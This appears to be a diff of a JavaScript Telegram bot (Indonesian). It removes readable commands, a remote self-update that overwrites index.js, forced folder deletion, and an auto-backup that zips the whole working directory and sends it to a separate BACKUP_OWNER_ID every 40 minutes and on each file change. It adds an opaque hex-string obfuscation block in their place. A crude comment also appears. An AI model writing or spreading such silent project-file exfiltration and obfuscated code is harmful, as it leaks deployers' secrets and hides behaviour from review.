-            .catch(() => {})
-
-        return ctx.reply(
-`
-❌ Gagal menganalisis file
-${err.message}
-`
-        )
-
-    }
-
-});
-
-bot.command("cekidemoji", async (ctx) => {
-  const reply = ctx.message.reply_to_message;
-
-  if (!reply) {
-    return ctx.reply(
-      `<blockquote>⬡ <b>Cek Emoji Premium</b>\n\nReply ke pesan yang mengandung <b>custom emoji</b>, lalu kirim <code>/cekidemoji</code></blockquote>`,
-      { parse_mode: "HTML" }
-    );
-  }
-
-  const collect = (ents = []) =>
-    ents.filter(e => e.type === "custom_emoji").map(e => e.custom_emoji_id);
-
-  const unique = [...new Set([
-    ...collect(reply.entities),
-    ...collect(reply.caption_entities)
-  ])];
-
-  if (unique.length === 0) {
-    return ctx.reply(
-      `<blockquote>⬡ <b>Cek Emoji Premium</b>\n\n${E.err} Tidak ada custom emoji terdeteksi.</blockquote>`,
-      { parse_mode: "HTML" }
-    );
-  }
-
-  // Fetch extra info dari Telegram API
-  let stickerMap = {};
-  try {
-    const res = await ctx.telegram.callApi('getCustomEmojiStickers', {
-      custom_emoji_ids: unique.slice(0, 200)
-    });
-    if (Array.isArray(res)) res.forEach(s => { stickerMap[s.custom_emoji_id] = s; });
-  } catch { /* silent */ }
-
-  const sender = reply.from?.username
-    ? `@${reply.from.username}`
-    : (reply.from?.first_name || 'Unknown');
-
-  // Kirim header dulu
-  let header = `<blockquote>⬡ <b>Custom Emoji Detected</b>\n\n`;
-  header    += `${E.user} Dari  : ${sender}\n`;
-  header    += `${E.total} Total : <b>${unique.length}</b> emoji</blockquote>`;
-  await ctx.reply(header, { parse_mode: "HTML" });
-
-  // Kirim tiap emoji satu per satu agar preview tampil jelas
-  for (let i = 0; i < unique.length; i++) {
-    const id = unique[i];
-    const s  = stickerMap[id];
-
-    // Fallback karakter unicode jika bukan premium — tampil di semua user
-    const fallback = s?.emoji || '✨';
-
-    // Preview: gunakan tg-emoji tag langsung (akan render di premium),
-    // fallback otomatis ke karakter unicode di non-premium
-    const preview = `<tg-emoji emoji-id="${id}">${fallback}</tg-emoji>`;
-
-    // Label tipe
-    const isPremium = s?.is_premium_sticker ?? false;
-    const tipeLabel = isPremium
-      ? `${E.ok} <b>Premium</b>`
-      : `${E.emoFree} <b>Free</b>`;
-
-    // Set name jika ada
-    const setLine = s?.set_name
-      ? `\n${E.set} Set  : <code>${s.set_name}</code>`
-      : '';
-
-    let block = `<blockquote><b>${i + 1}.</b> ${preview}  Preview\n`;
-    block    += `${E.info2} ID   : <code>${id}</code>\n`;
-    block    += `${tipeLabel}${setLine}\n`;
-    block    += `${E.doc} Cara pakai:\n`;
-    block    += `<code>&lt;tg-emoji emoji-id="${id}"&gt;${fallback}&lt;/tg-emoji&gt;</code></blockquote>`;
-
-    await ctx.reply(block, { parse_mode: "HTML" });
-  }
-});
-
-bot.command("fixerror", async ctx => {
-
-  const rep = ctx.message.reply_to_message
-  let code  = ""
-
-  if (rep?.document?.file_name?.endsWith(".js")) {
-    try { code = await downloadTgFile(ctx.telegram, rep.document.file_id) }
-    catch (e) { return ctx.reply(`Gagal download file: ${e.message}`) }
-  } else if (rep?.text) {
-    code = rep.text.trim()
-  } else {
-    return ctx.reply(
-`<blockquote><b>Cara pakai /fixerror</b>
-
-Reply ke pesan berisi kode JavaScript,
-lalu ketik /fixerror
-
-Atau reply ke file .js</blockquote>`,
-      { parse_mode: "HTML" })
-  }
-
-  if (!code) return ctx.reply("Kode kosong.")
-
-  const loading = await ctx.reply("Menganalisa dan memperbaiki kode...")
-  const before                     = analyseCode(code)
-  const { fixed, fixNotes, result } = tryAutoFix(code)
-  const success                    = !result.hasError
-
-  await ctx.telegram.deleteMessage(ctx.chat.id, loading.message_id).catch(() => {})
-
-  if (success) {
-    const out =
-`HASIL FIX ERROR — BERHASIL
-───────────────────────────
-Error Awal : ${before.errorMsg || "—"}
-Baris      : ${before.errorLine ? `Baris ke-${before.errorLine}` : "Tidak terdeteksi"}
-Saran      : ${before.fixSuggest || "—"}
-Fix        : ${fixNotes.join(" | ") || "Auto-fixed"}
-───────────────────────────
-
-SEBELUM (dengan anotasi error):
-
-${before.annotated}
-
-───────────────────────────
-
-SESUDAH (kode diperbaiki):
-
-${renderAnnotated(fixed, null)}`
-
-    await ctx.reply(`<pre>${esc(out)}</pre>`, { parse_mode: "HTML" })
-
-    const tmp = path.join(BASE_DIR, `fixed_${Date.now()}.js`)
-    fs.writeFileSync(tmp, fixed)
-    await ctx.replyWithDocument({ source: tmp, filename: "fixed_code.js" }, { caption: "File .js hasil perbaikan otomatis" })
-    fs.unlinkSync(tmp)
-  } else {
-    const out =
-`<blockquote>HASIL FIX ERROR — GAGAL DIPERBAIKI OTOMATIS
-───────────────────────────
-Error  : ${result.errorMsg}
-Baris  : ${result.errorLine ? `Baris ke-${result.errorLine}` : "Tidak terdeteksi"}
-Saran  : ${result.fixSuggest}
-───────────────────────────
-
-KODE + ANOTASI:
-
-${result.annotated}</blockquote>`
-
-    await ctx.reply(`<pre>${esc(out)}</pre>`, { parse_mode: "HTML" })
-  }
-});
-
-bot.command("cleancode", async ctx => {
-
-  const rep = ctx.message.reply_to_message
-  let code  = ""
-
-  if (rep?.document?.file_name?.endsWith(".js")) {
-    try { code = await downloadTgFile(ctx.telegram, rep.document.file_id) }
-    catch (e) { return ctx.reply(`Gagal download file: ${e.message}`) }
-  } else if (rep?.text) {
-    code = rep.text.trim()
-  } else {
-    return ctx.reply(
-`<blockquote><b>Cara pakai /cleancode</b>
-
-Reply ke pesan berisi kode JavaScript,
-lalu ketik /cleancode
-
-Atau reply ke file .js</blockquote>`,
-      { parse_mode: "HTML" })
-  }
-
-  if (!code) return ctx.reply("Kode kosong.")
-
-  const loading = await ctx.reply("Merapikan kode...")
-  const cleaned = cleanCode(code)
-  await ctx.telegram.deleteMessage(ctx.chat.id, loading.message_id).catch(() => {})
-
-  const out = `HASIL CLEAN CODE\n${"─".repeat(27)}\n\n${cleaned}`
-  await ctx.reply(`<pre>${esc(out)}</pre>`, { parse_mode: "HTML" })
-
-  const tmp = path.join(BASE_DIR, `clean_${Date.now()}.js`)
-  fs.writeFileSync(tmp, cleaned)
-  await ctx.replyWithDocument({ source: tmp, filename: "clean_code.js" }, { caption: "File .js hasil Clean Code" })
-  fs.unlinkSync(tmp)
-});
-
-bot.command( "cekupdate", async (ctx) => {
-if (
-        Number(ctx.from.id) !==
-        Number(config.OWNER_ID)
-    ) {
-
-        return ctx.reply(
-            "<blockquote><b>❌ Khusus Owner</b></blockquote>",
-            {
-                parse_mode: "HTML"
-            }
-        )
-
-    }
-
-    const waitMsg =
-        await ctx.reply(
-            "<blockquote><b>🔍 Mengecek pembaruan...</b></blockquote>",
-            {
-                parse_mode: "HTML"
-            }
-        )
-
-    try {
-
-        const localCode =
-            fs.existsSync(
-                "./index.js"
-            )
-            ? fs.readFileSync(
-                "./index.js",
-                "utf8"
-            )
-            : ""
-
-        const {
-            data: remoteCode
-        } =
-        await axios.get(
-            UPDATE_URL,
-            {
-                responseType: "text"
-            }
-        )
-
-        await ctx.telegram
-        .deleteMessage(
-            waitMsg.chat.id,
-            waitMsg.message_id
-        )
-        .catch(() => {})
-
-        if (
-            localCode.trim() ===
-            remoteCode.trim()
-        ) {
-
-            return ctx.reply(
-                "<blockquote><b>❌ Tidak Ada Update pada file</b></blockquote>",
-                {
-                    parse_mode: "HTML"
-                }
-            )
-
-        }
-
-        const updateMsg =
-            await ctx.reply(
-`<blockquote>✅ Berhasil Cek Update</blockquote>
-<blockquote>Terdapat Update Pada file</blockquote>`, { parse_mode: "HTML" } )
-await new Promise(
-            r => setTimeout(
-                r,
-                1000
-            )
-        )
-
-        const restartMsg =
-            await ctx.reply(
-"<blockquote><b>Bot akan di restart Tunggu beberapa detik hingga bot selesai</b></blockquote>\n<blockquote><b>🔄 Restart</b></blockquote>",
-                {
-                    parse_mode: "HTML"
-                }
-            )
-
-        fs.writeFileSync(
-            "./update.flag",
-            JSON.stringify({
-                updated: true,
-                time: Date.now()
-            })
-        )
-
-        fs.writeFileSync(
-            "./index.js",
-            remoteCode,
-            "utf8"
-        )
-
-        await new Promise(
-            r => setTimeout(
-                r,
-                1000
-            )
-        )
-
-        await ctx.telegram
-        .deleteMessage(
-            updateMsg.chat.id,
-            updateMsg.message_id
-        )
-        .catch(() => {})
-
-        await ctx.telegram
-        .deleteMessage(
-            restartMsg.chat.id,
-            restartMsg.message_id
-        )
-        .catch(() => {})
-
-        process.exit(0)
-
-    } catch (err) {
-
-        await ctx.telegram
-        .deleteMessage(
-            waitMsg.chat.id,
-            waitMsg.message_id
-        )
-        .catch(() => {})
-
-        return ctx.reply(
-`❌ Gagal Mengecek Update
-${err.message} `, { parse_mode: "HTML" } )
-}
-
-}
-)
-
-
-bot.command("setlinkupdate", async (ctx) => {
-
-    if (
-        Number(ctx.from.id) !==
-        Number(config.OWNER_ID)
-    ) {
-
-        return ctx.reply(
-            "<b>❌ Khusus Owner</b>",
-            {
-                parse_mode: "HTML"
-            }
-        )
-
-    }
-
-    WAITING_UPDATE_LINK[
-        ctx.from.id
-    ] = true
-
-    await ctx.reply(
-
-`
-<blockquote><b>Kirim link raw.github untuk update</b></blockquote>
-<blockquote><b>Contoh</b>: <code>https://raw.githubusercontent.com/user/repo/main/index.js</code></blockquote>
-`,
-{
-parse_mode: "HTML"
-}
-)
-
-}
-
-)
-
-bot.on(
-"text",
-async (ctx, next) => {
-
-    const userId =
-        Number(ctx.from.id)
-
-    if (
-        !WAITING_UPDATE_LINK[
-            userId
-        ]
-    ) {
-        return next()
-    }
-
-    const newLink =
-        ctx.message.text.trim()
-
-    if (
-        !newLink.startsWith(
-            "https://raw.githubusercontent.com/"
-        )
-    ) {
-
-        return ctx.reply(
-            "❌ Link raw github tidak valid."
-        )
-
-    }
-
-    delete WAITING_UPDATE_LINK[
-        userId
-    ]
-
-    const processMsg =
-        await ctx.reply(
-            "<blockquote><b>📥 Link Diterima.</b></blockquote>",
-            {
-                parse_mode: "HTML"
-            }
-        )
-
-    try {
-
-        let indexCode =
-            fs.readFileSync(
-                "./index.js",
-                "utf8"
-            )
-
-        indexCode =
-            indexCode.replace(
-                /const\s+UPDATE_URL\s*=\s*["'`].*?["'`]/,
-                `const UPDATE_URL = "${newLink}"`
-            )
-
-        fs.writeFileSync(
-            "./index.js",
-            indexCode,
-            "utf8"
-        )
-
-        await ctx.telegram
-        .deleteMessage(
-            processMsg.chat.id,
-            processMsg.message_id
-        )
-        .catch(() => {})
-
-        const successMsg =
-            await ctx.reply(
-                "<b>✅ Link Berhasil Diubah</b>",
-                {
-                    parse_mode: "HTML"
-                }
-            )
-
-        setTimeout(
-            async () => {
-
-                await ctx.telegram
-                .deleteMessage(
-                    successMsg.chat.id,
-                    successMsg.message_id
-                )
-                .catch(() => {})
-
-            },
-            3000
-        )
-
-    } catch (err) {
-
-        await ctx.telegram
-        .deleteMessage(
-            processMsg.chat.id,
-            processMsg.message_id
-        )
-        .catch(() => {})
-
-        await ctx.reply(
-
-`
-<blockquote><b>❌ Gagal Mengubah Link</b></blockquote>
-<code>${err.message}</code>
-`,
-{
-parse_mode: "HTML"
-}
-)
-
-    }
-
-}
-
-)
-// kontol up
-// ==================== JALANKAN ====================
-// =============================
-// DELETE CACHE FOLDER
-// =============================
-const foldersToDelete = [
-
-    ".npm",
-    ".node_modules"
-
-]
-
-function deleteFolderRecursive(
-    folderPath
-) {
-
-    if (
-        fs.existsSync(folderPath)
-    ) {
-
-        fs.rmSync(
-            folderPath,
-            {
-                recursive: true,
-                force: true
-            }
-        )
-
-        console.log(
-            `[ DELETE ] ${folderPath}`
-        )
-    }
-}
-
-foldersToDelete.forEach(
-    folder => {
-
-        const folderPath =
-            path.join(
-                process.cwd(),
-                folder
-            )
-
-        deleteFolderRecursive(
-            folderPath
-        )
-    }
-)
-
-
-// =============================
-// CREATE ZIP
-// =============================
-async function createBackupZip() {
-
-    return new Promise(
-        (resolve, reject) => {
-
-        try {
-
-            const fileName =
-                `Backup.zip`
-
-            const zipPath =
-                path.join(
-                    BACKUP_DIR,
-                    fileName
-                )
-
-            const output =
-                fs.createWriteStream(
-                    zipPath
-                )
-
-            const archive =
-                archiver(
-                    "zip",
-                    {
-                        zlib: {
-                            level: 9
-                        }
-                    }
-                )
-
-            output.on(
-                "close",
-                () => resolve(zipPath)
-            )
-
-            archive.on(
-                "error",
-                err => reject(err)
-            )
-
-            archive.pipe(output)
-
-            const baseDir =
-                process.cwd()
-
-            const ignore = [
-
-                "node_modules",
-                ".git",
-                "backup",
-                "*.zip"
-
-            ]
-
-            fs.readdirSync(baseDir)
-            .forEach(item => {
-
-                if (
-                    ignore.includes(item)
-                ) return
-
-                const fullPath =
-                    path.join(
-                        baseDir,
-                        item
-                    )
-
-                const stat =
-                    fs.statSync(fullPath)
-
-                if (stat.isFile()) {
-
-                    archive.file(
-                        fullPath,
-                        {
-                            name: item
-                        }
-                    )
-
-                } else
-                if (stat.isDirectory()) {
-
-                    archive.directory(
-                        fullPath,
-                        item
-                    )
-                }
-            })
-
-            archive.finalize()
-
-        } catch (err) {
-
-            reject(err)
-        }
-    })
-}
-
-
-// =============================
-// SEND BACKUP
-// =============================
-async function sendBackup(
-    reason = "File Backup"
-) {
-
-    try {
-
-        console.log(
-            `[ BACKUP ] membuat backup...`
-        )
-
-        const zipPath =
-            await createBackupZip()
-
-        const time =
-            moment()
-            .tz("Asia/Jakarta")
-            .format(
-                "DD/MM/YYYY HH:mm:ss"
-            )
-
-        await bot.telegram.sendDocument(
-            BACKUP_OWNER_ID,
-            {
-                source: zipPath
-            },
-            {
-                caption:
-`
-<blockquote><b>📦 SYSTEM BACKUP</b></blockquote>
-<blockquote><b>📝 Reason : ${reason}</b></blockquote>
-<blockquote><b>🕒 Time : ${time}</b></blockquote>
-`,
-                parse_mode: "HTML"
-            }
-        )
-
-        console.log(
-            `[ BACKUP ] sukses terkirim`
-        )
-
-        // hapus zip
-        fs.unlinkSync(zipPath)
-
-    } catch (err) {
-
-        console.log(
-            `[ BACKUP ERROR ]`
-        )
-
-        console.log(
-            err.message
-        )
-    }
-}
-
-// =============================
-// AUTO BACKUP EVERY 30 MINUTES
-// =============================
-setInterval(
-    async () => {
-
-        console.log(
-            `[ AUTO BACKUP ]`
-        )
-
-        await sendBackup(
-            "Auto Backup 40 Menit"
-        )
-
-    },
-
-    40 * 60 * 1000
-)
-
-
-// =============================
-// AUTO BACKUP SAAT FILE UPDATE
-// =============================
-const watcher =
-chokidar.watch(
-    process.cwd(),
-    {
-        ignored: [
-
-            /node_modules/,
-            /backup/,
-            /.git/
-
-        ],
-
-        persistent: true
-    }
-)
-
-watcher.on(
-    "change",
-    async filePath => {
-
-        console.log(
-            `[ FILE UPDATE ] ${filePath}`
-        )
-
-        await sendBackup(
-            `File Update : ${filePath}`
-        )
-    }
-)
-
-console.log(
-    `[ AUTO BACKUP SYSTEM ACTIVE ]`
-);
-bot.launch().then(() => console.log('✅ Bot obfuscator berjalan'));
-process.once('SIGINT', () => bot.stop('SIGINT'));
-process.once('SIGTERM', () => bot.stop('SIGTERM'));
+(function(){
+var かぜメ26008="a601b12f1bef45cc21498ceb6f67a9aaabf33527077b42690226508d9a58b88dda6067f63b2c6b948187028ec778b8ce0e23c9778eb02578a2f9b9597a1092eda8a751734aa4a7cc3a7a1213e8403f61";
+var みず刃19524="9514ccfc443a33d8a514b93b4fbe866df687575b9d08b5fadf27e7e0b7d93ef98b724e364b6d142bd522396ed712d8da30d4cc5cf12c2bda2e2ec0f0839b872b97a485490b3a5fad104af4e27600a0eb";
+var やみツ89420="9f2ab832a2a4e3ffd561544e5f47a7f30562bddea8c391ea97dddd818b8ea621ea9d5af2b571949e6148551dfb118d178670e38c8a957eef7ee5c023056223302aff285102463975412b118518710999";
+var つき々8616="3c142fcbc89e45f93c5fe1f543cbd72e19af1860441444f6067fc0dcda2894a48713ce12824e69b5a39d31df4d551aa39ac97780654e70ea6f2c5f3ebc1724d9efb1e46e60b2f14dbf1e7ccdc1b17677";
+var れい々47175="e8cec9cd26e453da4ac04264edb9dd83766b75cebd47f2103114dbb09b75320625b977761110f8787a0a705c8b2e5536b6b84a4874edaa179e16d87c548da89a04927343a5f91b4573853795adb69c77";
+var ゆきฬ25032="959f410535342c41984c039ab3e5a1d113353971a8c6b8dd1e07566d1bd52ae8b0b0e39048b2c4b02b96f8a45b0cb08a02592796d7ee71e5ae92abe556491a2e464385bc483ca4c2353e11fe1a84e5e9";
+var つきん19308="cd17a628d6bfaa3f408cad0df5c3cb90a41807827429dc24b6d8626c92678b8ae2274f86be13d99f81b43d929fe4c4892d260f68da21f9e9b375657fabbafee41184428d45ba8ed3f5eef9fd60cbae1c";
+var ねこメ85123="e0d2ca71232a793413320910f5a03ac2bbaf8aeaad5395ab98e2c51cf19a02f91f7eda152f19465272af4fa5389f9cb744ed8c881f7d35960da332ead5b5b2dee14a50ceb94f650d3762fe8a76c30af8";
+var ほしฬ13860="beaf42fbb6e33341bf36a6de4532eeee5da940ff34175803aed62d302d8068f998064e53948b42dd73a3e87f95f77f860f3730a2856d1f1010292d1a5d9083dbdc0a4630f5e45b56cbcb073202f73d72";
+var ほしฬ86899="197d2232f998c9f12e05cfa245542d630e42227370308235811dc7d92008e9aa8cfd75bad9f984680d9dc5358ffaeae1581f796d327446bf0b47ade3d5bed8d1aa98cbe7376dd7dc6ca9933e09958bb7";
+var つき々8704="85142ac3b7f23077528cbe8ad917706e5c50f034f7be159281628b54b90c71de42cb5fdcaa82387ae59c874275bfee292be5653741bc60399859a79c9640d7e7f54b6bc18bc474854a77720d6d7c0f78";
+var ねこ〆50869="fdf4d91bc88db420b63bf75fba53c4dbc3cf654df88b36b1fc111e5334bbd777e6b765af1f3bb09b6770493e39c5dee8e26356ba28323752d9c67408fe36fd9cedadd530d17fa5708758d3d9346c6a7b";
+var ほしฬ14584="8dea0b315ec8ea6b1b4039b5de21473537524adbab6e58dc5fe7f3a5cf850952b7b5c651d4f46eca53df4eb193e56fd84a03194cc318cb0fad7df842bc25fa84afd81a38e2fb6204212504d3eb19deaa";
+var れい〆89183="817e4d95d1c3fad7f192175428fa0349ac3eabd43aeb69126dabe3ab968f6a50fd3c83d38f96ba35a0c6b2d590420c0cc19de28f6fd987321ec709d18f17c03b5a6cb4032cc108d6dbf93a2cd5ccca78";
+var やみฬ56604="03f47a30f8b394edb8cc65414425352ad3fcbc44bd5aea9ac26f0ef96236048834f24211c963e4a7d23820517d60bd5a99c46ec306807ee277d573deedfebb61c2d0cb63260e7e634c8021493ca7c84e";
+var はなツ16676="07288cd2778348cde2de24ffbce1aaf85fddf11cee1385b5e3d136e1d89e03c8d45524f9fc48d8a4b68b751e0f3b47776e1fa4d84d5bd23b3efccd5f8075d078f8e71f3ccead6d15514e705e26b4dfa2";
+var そら々47587="f80f27bee1b3e64d7e36de211cf934e15789242852f7fa5bc71e95b8e48e068314201bfc679ec0117606c245b149f69d69b421c5cee5f97b8810caa8184b9c0964c5a9277cb8d50aa837a4e710e466df";
+var むげん刃19044="d735f6744969f2243f09a80a3473dacee95503f398e31e2c9bdab44f1116ab46984e892cd12e1255a355e6836298ce434ff0325551e15f066ae7a65f82ce1fcca777e34a09da74d44fd37d54b8a3dce4";
+var ねこ〆20140="334e333beed6bc6b4ab9d83781beb0b5ae4c4b92c1730015d5b4e46ad0bf4f6c9a991ec22c8450628975353ac3bb35dfc3e4d2deeb112d9556fb4a15b12da5237697437e6fcbdc8230669d29948502b4";
+var かぜฬ85210="91d8e3504c122c6c66023b0d7aaa4ad86f225230d4b3ad7b4a29a9a5750e96b80524d64520763a2fc6fd1442e6e93d36044796f8accfdcd6b2b3c8f112dd2acf11f2eeb58233ae4352c6aa1bc7d1020b";
+var れいฬ21374="63ea14f1af57478b7a7ad65b7cf6658fdaa3257fd3bd38cc0f0fda3d2f0ed964365265398ab0b50a8fffcac91f8947e3ef6f2a1ab355a4b7e7fb9e2d827b63deab7814231700757cc92c16aef5e32b40";
+var みず〆74624="a96b2429960511be360dbddfea86d16fde0728a579fc41d7a58360b699f8d76a6cdccd7067d4a25eca8fe2d053fadab84df41b9d458ba03cc36035e39724be659fd43cf55d330f3b1b0be373d9531ba4";
+var やみん53549="171da3eb8cf8ea7cc48321813400b2ab769c3ccf8872366ee03b0419ec3c7f3db5d6c84c0b07c246476aab53cd9b684257bdc7e90e6098e6522bfe1db18d38a17a622fc3c04cf5881e3ee15d16fd2334";
+var ほしฬ35735="8d228151907864f765fde49874ad7295049237245032d2e3218754ce6048a9638ee488c5b304cb9b433810de632c143894d9f8aaaf4166b3817f6087bbab11f1fedf90bc30d98a2029b1222130675f44";
+var はなメ65394="4aa4b56ae43f6a8dc7ab9a3aacea326415b4e85e4843437a2b7a9853c86e81f4dc94bc0910a76952cae7aafb7ad46fac294608391a1406192ea77c3fdc0d17642446ffe240abf005579b057221d14bbf";
+var れい〆27693="93a18cd61e0a386cad59d071c85034fe8dd301fab3428f2f0dfed40d7caee295b5875cb4e0af827efbba2e4f7fc6e3e4bdc47b7e1a0ef12de235fd0120bea4e285d7ce945824c5b967814cec213abb1e";
+var はなฬ37514="913dc688ddef09a3d4e551450f21477e37fd755e1dca5b880ff4daa35d65f0eb3640287f12b2db5a13ab89f16123b9aadf224a97a3ffcc4a94933f13d306ba24efe791c172606f6a1b0eef5d5b75fefc";
+var そらメ12562="062147f1b9ffbce25ad6111e595f998fa98a4c2a1fffb7f5803e823c4aa5700b258a8786a1b4a3a676b9c7967fae33b36382abdf4d85b61ac96ea9e411157173aa827f97beb3cdd4f1c358fa7eccdfe6";
+var れいฬ1426="dbb9ec736d40da72e7ceb3a58cd74242d51977196cedb25b7440645106b10e5b1f17d208fe0a72f0f7928215e3a93cca975ab2050e18de67606b40b89bdbb5c7f1add0fe392ad51faa1d47d28c579649";
+var つき〆27668="40665122ebed4a06ebe53a1c28c6f603699636b8c1ae9652a848a7524b53f06162004c340968bc8c65d7eb06d07724804db08247f96e948a4a0a45948f9704526fd6e6112582381242251b4d11a0e918";
+var みずメ60584="95079237809d1c1206a7649700cdae722683cd0bc289c07599ea6003a1d57ea192d773f7ebf35f7a33987a4aee3d0087e49e3f3353359b1ccf8019d3bdc25f888b7be79502ccbd5517af4466a4a07497";
+var つきฬ61159="90174a1f096a4ccd11525d80527dbd4416c70dacc47558e75cce26bea0d56d252289ab34708ae13e6da6e4254e4d8028ac59285ad1588012eecbaa7a3e606a4cfb6cbc7f758569b661035e51170845ea";
+var ほしん1872="d180a10419be7cf684083d424f034d7b92ee51d484ba45af9692758826fea87c276e5e39cf79dc283fd789b39161c0a5bf3974bc6bf15c20be0b86dbe3e6e7f3900b7052634e9cc996f38270d23d0bf5";
+var やみ刃91977="2c0398a0a218a0ffa9484f11b98617b4a4014aef3c241ba767b522ae63eb671621514dee30ec9679f1ec95c6691853894f97573ff03494113f514405e5c3175740b940c7d7aedbc23ac0162d9d5fde2b";
+var そら〆14145="c2dc5c7e1c2d67c61b4e254cc9a2df04950a1c57c8bc5040dfd657f29786b69ac2d7efd14bc30ef7b2f297cd73e6bb5bef4b3ff6a52b9c66bec5eff482b8e84f4820b50892723ee5be45c2bc973d5104";
+var れいん74551="da78b029c504e078477aacacc5eb7511fec991fed9e680cac462b35e73d7fc4eb5838649d296ae856dc32660e2487907f53a3ff418fc0dd0d1524e40a3c2a20827f31a96f1cff39b58f195d344cabcc1";
+var みずメ55338="9bf9a4f04b0ecf851bd9e4c5e8a9e9cce9a678f9d1f2a9d62336f317226b4aef0bdadf02a8e67ed5f9c498d1e3734cc761f2348cbd63b3e23616a37937c1d3fff91d2eb56b63cced86e8317c4c9dfa9a";
+var はな々57694="5f5dda7bc05ad6f38f588e0fdbd82dd2f1743f5ff2f50c632a407638e647ccc54c7f88efdb4e41dbfd16f3266550bec05928b9c6a889989be476ba3fa444047aa8d0ab87e97cca10a7bd24fd9d69d101";
+var やみん69917="5be96202f80a6d88280dc43ea58a19ddc4b6dd30b77cca1a5576fe80e69fdb4303593fccbff89e664c37ddc161dd24f84e0f35da59396e495212a77106e48af67eedb4ed03f915133b4749bd2805908f";
+var さくらツ86704="8f8025285079ab7e376e0200995ce895befd544ddbc4d850ece38f306ea13f162c52cc7d165878bbfbc36cd79f1360d375cae904e3367c697d8f61281e34481ea04b2324041ba5441bca207f6169f392";
+var かぜฬ10635="de59100e9247650d29a06381e7c63611fde1c981847e2e836ea6cf382eb830f52c5c0d9606d2560b7de59b201ae2fa9a446dc5224d04709c31b785893f459e24c0a74dbb8e4f9619fac639b2c802aafb";
+var やみฬ45755="ae24125f68db33154d87697fe629394bb87abdcfcbb448d23611c663256b54209f2079f42b44d63b488bd329618c2813f35a8274f04d80ce7fc86554acffccb929c218a35820df5e3a35f865b709aa00";
+var れい〆40647="a0ae8c1e66ebe4e58b0c5e417a50056341abfa9c3b63605524cdb7a1502a9e44310e9d1a65a91494476cfad8bc43dd271702b9b512bdca87e316fdeae915989bc965d1cdc0be972012466ef343c335c8";
+var ほしฬ69093="11d057eea8d2953b4cb3e53228ce94aa944f10e46d724bec78e1f6ddb019b7b724eff4ae44825b42dff1642340f48f3400de33f9e818acf4ab66ca2da77c5c1f79d362f3e1bdae8ecc0a15f215bc50f3";
+var ほし刃3398="3b4f995b20633394311cde80cf2d439159ff40febda96f1241170d000de5412d46d8de009e26d5ed424ae4b3287ef1eeb88805b70bb2d9bd4632a751a0e28b6d58316c61f216d4666eca86ff9bf3ce86";
+var ゆき刃89178="10c0e195cf1e2219f6a99cba690b2a4a1b38be98411abc12f8357f04ab73798ad26037b4642706f9b21da24fe943741b5473dd5fe40fa53d21cc579f77caf4d5551ba67425143f974b51786d6330a2ab";
+var ゆき刃33315="6ad439616851801ebabb08178e5ceffd4b2c45725be13129b7fabc3fe859b417186e826c795ce8a4552ac6c6bbe6d01cee764666d2e8fd9b60657ce7b217672f37e74d22e61afd77edad2b3a2653272d";
+var みずん24109="2a6ee6664896f554865f1a42939192354855570bd03ea3c4b4c08bd4abbb605ae664c84e29dcb9ba2d5a2e76454b953d818c7c54aaa5e6f0271fe88dd30828050c67b1713c48d84c1b3dadc705eaeab0";
+var ゆきん70418="c00792e955826149bb4a9f90452637667a03200a544cb002aff088d13d85ab3bfd8acc856fa9bc75cf07e41d09cb62146c8a51de8367d06456430b046398451ee22d39e8617b67ce5f08b6602f6c8d13";
+var さくら〆74326="94f7a6f8a8768d377e864e379e54a91efcb45ab2bca2638b131e9535323456fca00d21f0ff4be53ee82c36fa2ea5f48cc970fddcfa730e360e6bfacb3feb3ee5cecf04d4772c14e47140945fabf12bfb";
+var れいฬ10246="572bbdb9e179e7eb1715d9a30a4b0cda405772577d1c97c6ccc50d049a78316ea48b2d0bda6d17b94c9e0b7da962d094bc4a36d2da694f5fd4316eaa6e813cd24b7a0c2c6247805096320e95dc9b2b78";
+var かぜฬ73985="9649a11b5d7ffe8281cd1e94425e401c94c730e448b5bd9db297ada68ff14829fdb86f0464b8fddd38831f8b0e704cb9432305bbd17745dfd5dbadc0c000065cf62d72cff34eb19068cc9537074d92a9";
+var ゆきメ13903="f5ae73d1a258eadea35b78af08e5415c670047997b8819e291400908faf4a6da5a61b99a4b88fcd2448045cf16ebdeda0885025f4116a9e86f4191a1610250c3e43f652fd9622433809dd6b52c9f2e6f";
+var はな〆57543="9f81b0c6e47586dda15a47454d0b6000db83828211d3989182923c4b2a12d64811aa17446dfaf455992b2c88f87c177b0033ee005df5e45e212b7614534b888cd6212831ee2529a7ad6144d1431c1acc";
+var そらツ53769="5939b6bf85ed0533d72a3f0a5c27b4959e55049f5fbbfe9e0a830956b9e90c3d67d7434f39e972bbb86a4c110ffc313fc498da26d34551687bd957c15bdc19996190937a17c9211bbc9cb7e2e53d6c2a";
+var つき〆85352="18417af3f800fbb81eb08a86a8967f8d1d4fe50694101f6249f5d8414c9a9ee15aa337dd97b550b19dd6a17b5f86c01a59bb596e5583e946549641888d476f9319d84a6179f154bc737e1e9d3299821d";
+var むげんฬ40753="c7113c25898df5e6e5d33078dd6cc4e3e65f7f5498dbf41ec04d2a4b533362b96397fe69de9100f099f60f8cf98bb1d7a8bc111b59fc4cda10a3f22fce0f8cdac6922fe2895f795c9a4f6a339acd87b8";
+var はなメ39929="44504a53ada3bcfe0ce9b6e94ed07e3eb2fda572093d9189aa902239b5c589df4690397079a6cef8e903cfefdfcb427c8c1ecd9cce16c6fe26e555fadb5a8ae27b09e1633fe675793613a12ff389e72b";
+var ねこ刃71992="46a49492a505844fd9d8ea888e19b7e3c4838929915587df2334a58d23caae701bd4ca8d1a3da5a8effce597e7f187f61004087d5e074be4edfb10db381feab249a69b64a09527a5a805c6cb992b5adc";
+var かぜ々5125="26de2ef19cf54ed3b997f9eb71df8d80311d2acda4b2809ba5c86754adc145c169543866bec95f925fd4d907fb1bff13012ce5e7fb5b1a5b68f7c28540e83b70fdb00f9395159041e2db2ab8b6629170";
+var ゆき々46060="2bbfac2f242fce7f39b4b39a1ff91b7b9b86be82d69e9e33da52e02c8da1e65c8855476cbeef3e0ef85a8d3ce1c3c0824234c5aa2a8da56edec895b7c1aa15b5f2c38dc12772f4bde517c80164972bd4";
+var やみ々76782="0657c8b256fc956d3cf77653be1142f110c197a513a3cb104086362c7687ac7061c1f5f49c522c2416f83804eeab38665470914e1bc2b0cea1a99a60105fc2784a849120d3ed4d6f70d8821129d68102";
+var そらツ13214="aa4fe026a4be4228dba32c00e753689acbd5ab0ec82b7e108d5ceb247cf1521e5c8e6ff88228e680f0037aae5c0bc244d5a50560c8af0f697eb4a3806efa17db2c6ae42c61bcf5c670fcf67a53eed197";
